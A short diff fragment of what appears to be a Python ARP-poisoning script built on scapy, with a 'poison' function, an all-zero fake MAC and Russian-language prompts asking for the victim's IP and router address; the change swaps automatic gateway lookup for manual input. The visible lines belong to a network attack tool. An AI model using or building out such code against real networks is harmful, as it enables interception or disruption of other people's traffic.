@@ -14,7 +14,7 @@ def poison(target, router, targetMAC):
 
 FAKE_MAC = "00:00:00:00:00:00"
 target = input('Введите ip адрес жертвы (пример: X.X.X.X): ')
-router = scapy.conf.route.route("0.0.0.0")[2]
+router = input("Введите адрес роутера: ")
 
 
 while True:
